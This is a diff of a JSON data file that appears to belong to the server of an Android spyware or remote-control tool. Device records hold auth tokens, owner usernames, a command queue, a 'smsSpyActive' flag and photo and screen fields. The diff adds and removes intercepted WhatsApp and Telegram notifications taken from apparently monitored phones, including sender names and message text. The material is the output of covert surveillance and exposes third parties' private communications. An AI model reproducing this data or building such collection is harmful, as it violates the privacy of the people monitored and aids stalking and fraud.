@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776957167277,
+    "lastSeen": 1776957176282,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎61 pesan dari 40 chat",
+        "time": "23/04 23:12",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776957169935
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Meii",
+        "content": "ok",
+        "time": "23/04 23:12",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776957169919
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4003,22 +4019,6 @@
         "time": "23/04 20:41",
         "pkg": "com.whatsapp",
         "receivedAt": 1776948086710
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎76 pesan dari 44 chat",
-        "time": "23/04 20:41",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776948086237
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎66 pesan dari 43 chat",
-        "time": "23/04 20:41",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776948064563
       }
     ],
     "galleryPhotos": [],
@@ -16669,7 +16669,7 @@
     "deviceName": "HP-XXX-2D24",
     "ownerUsername": "is",
     "token": "34abd4f14a5676f3cd2d30b18941c847",
-    "lastSeen": 1776957168032,
+    "lastSeen": 1776957177032,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-23T15:09:35.885Z",
@@ -16685,6 +16685,62 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "⏤͟͟͞͞𝑯𝙓 𝚰𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝚰 𝐓𝐄𝐒𝐓𝚰 𝐅𝐋𝐔𝐗𝐎",
+        "content": "『 Transaction Successfull  』\n━━━━━━━━━━━━━━━\n📦 Produk : MC/REKBER PANEL\n💰 Harga : Rp1.000\n💳 Pembayaran : QRIS\n🕒 Waktu : 2026-04-11 23:57\n✅ Status : Tercatat & Selesai!\n━━━━━━━━━━━━━━━\n👤 Owner : @KINKFLUXO\n━━━━━━━━━━━━━━━\n✨ Terima Kasih Telah Bertransaksi ✨ !",
+        "time": "23/04 22:12",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776957179143
+      },
+      {
+        "appName": "Telegram",
+        "sender": "KORBAN SI YATIM @ceobotbadakkgtg: fari Waaa",
+        "content": "yg mau beli nokos dm gw",
+        "time": "23/04 22:12",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776957179045
+      },
+      {
+        "appName": "Telegram",
+        "sender": "FELIX HOSTING TESTI",
+        "content": "\n📈 UPDATE HARGA WHATSAPP\n\n📍 Negara: Indonesia\n🕐 Waktu: 23/4/2026, 22.12.57\n📊 Total Server: 56\n📦 Stok Total: 1141\n\n━━━━━━━━━━━━━━━━━━━\n\n🟢 HARGA TURUN!\n\nServer 1\n💰 Rp2.850 → Rp2.250\n📉 Turun Rp600 (21.1%)\n📊 Rate: 100% | 📦 Stok: 1\n\nServer 13\n💰 Rp3.800 → Rp3.300\n📉 Turun Rp500 (13.2%)\n📊 Rate: 17.93% | 📦 Stok: 4\n\nServer 14\n💰 Rp3.900 → Rp3.300\n📉 Turun Rp600 (15.4%)\n📊 Rate: 13.16% | 📦 Stok: 5\n\nServer 15\n💰 Rp3.950 → Rp3.350\n📉 Turun Rp600 (15.2%)\n📊 Rate: 12.48% | 📦 Stok: 5\n\nServer 16\n💰 Rp3.950 → Rp3.350\n📉 Turun Rp600 (15.2%)\n📊 Rate: 16% | 📦 Stok: 5…",
+        "time": "23/04 22:12",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776957178991
+      },
+      {
+        "appName": "Telegram",
+        "sender": "REHAT / SLOWRESS",
+        "content": "Ended task: #fNDPPPqV",
+        "time": "23/04 22:12",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776957178975
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝟮𝟲.𝟬𝟲",
+        "content": "ACC BACKUP GW\nCLICK",
+        "time": "23/04 22:12",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776957178958
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝐌𝐔𝐑𝐁𝐋𝐀𝐒𝐓 𝐏𝐑𝐈𝐕𝐀𝐓𝐄 #𝐂𝐁𝟏: BOT_MD_OMDIT_MULTI_DEVICE",
+        "content": "❌ @Sksosisjis, promosi tidak diperbolehkan di grup ini!",
+        "time": "23/04 22:12",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776957178942
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "1001 pesan baru dari 78 obrolan",
+        "time": "23/04 22:12",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776957178767
+      },
       {
         "appName": "Telegram",
         "sender": "CUAN CUAN GACOR 2026 #13: Angkasa Bot Multi Device",
